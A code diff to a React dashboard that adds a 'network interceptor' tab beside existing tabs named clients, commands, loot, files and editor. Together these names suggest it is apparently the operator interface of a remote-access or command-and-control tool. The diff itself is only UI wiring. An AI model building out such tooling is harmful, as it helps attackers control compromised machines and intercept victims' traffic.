@@ -11,8 +11,10 @@ import TasksPanel from './tasks-panel'
 import FileBrowserPanel from './file-browser-panel'
 import FileEditorPanel from './file-editor-panel'
 
+import NetworkInterceptorPanel from './network-interceptor-panel'
+
 export default function Dashboard() {
-  const [activeTab, setActiveTab] = useState<'overview' | 'clients' | 'monitoring' | 'commands' | 'loot' | 'analytics' | 'tasks' | 'files' | 'editor'>('overview')
+  const [activeTab, setActiveTab] = useState<'overview' | 'clients' | 'monitoring' | 'commands' | 'loot' | 'analytics' | 'tasks' | 'files' | 'editor' | 'network'>('overview')
   const [selectedClient, setSelectedClient] = useState<string | null>(null)
   const [editingPath, setEditingPath] = useState<string | null>(null)
 
@@ -37,9 +39,10 @@ export default function Dashboard() {
 
         {/* Main content area - Dynamic view based on tab */}
         <div className="flex-1 overflow-y-auto bg-white/[0.02] backdrop-blur-[2px] transition-all duration-500">
-          <div className="p-1 h-full"> 
+          <div className="p-1 h-full relative">
             {activeTab === 'overview' && <MonitoringPanel selectedClient={selectedClient} />}
             {activeTab === 'commands' && <CommandPanel selectedClient={selectedClient} />}
+            {activeTab === 'network' && <NetworkInterceptorPanel selectedClient={selectedClient} />}
             {activeTab === 'monitoring' && <MonitoringPanel selectedClient={selectedClient} />}
             {activeTab === 'loot' && <LootPanel />}
             {activeTab === 'analytics' && <AnalyticsPanel />}
